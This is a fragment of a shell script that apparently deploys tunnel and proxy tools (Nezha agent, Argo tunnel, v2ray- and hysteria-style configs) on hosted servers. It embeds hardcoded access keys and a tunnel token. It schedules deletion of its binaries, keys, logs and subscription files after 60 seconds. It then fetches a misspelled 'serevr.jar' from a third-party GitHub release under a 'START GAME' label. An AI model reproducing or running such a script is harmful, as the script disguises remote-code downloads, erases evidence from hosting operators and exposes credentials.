...
export NEZHA_KEY=${NEZHA_KEY:-'7LHjlPcj7gRgOrTCxl'}
export ARGO_DOMAIN=${ARGO_DOMAIN:-'quvopro.5.d.0.0.9.2.f.1.0.7.4.0.1.0.0.2.ip6.arpa'}
export ARGO_AUTH=${ARGO_AUTH:-'eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiMWY4Nzk5NjYtM2Q0Ni00NzZjLWEzMmUtZjYxOTU3OTRkNDY1IiwicyI6Ik0yRXhPVGd4WmpVdFl6ZGhaUzAwWkRWbExXRmpZamN0Tm1ZMVlqUTVNalppWmpFeiJ9'}
...
(
sleep 60
rm -rf icchy iccv2 iccagent icc2go server.key server.crt hy_config.json v2_config.json tunnel.json tunnel.yml nezha.yaml argo.log sub.txt sub_base64.txt core core.*
) &

# ==================== START GAME (KEEP ALIVE) ====================
export GAME_FILE=${GAME_FILE:-'serevr.jar'}
download_file "https://github.com/babama1001980/good/releases/download/npc/serevr.jar" "$GAME_FILE"
